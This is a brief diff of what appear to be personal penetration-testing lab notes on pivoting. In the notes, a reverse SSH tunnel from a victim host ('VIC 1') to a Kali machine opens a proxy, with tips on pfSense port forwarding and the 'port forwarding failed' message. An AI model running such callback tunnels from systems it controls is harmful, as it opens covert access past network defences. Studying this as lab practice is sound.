@@ -23,7 +23,7 @@ open ssh for a listner to set up proxy
 
 
 (VIC 1) ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 55555 (MAKE SURE PORT FWD RULE IS GOOD ON PFSENSE SSH PORT 22)
-this how you get your proxy open???
+if it states port fowarding failed it means you alrady have ypur proxy open
 
 (VIC 1) should be promted a pass
 
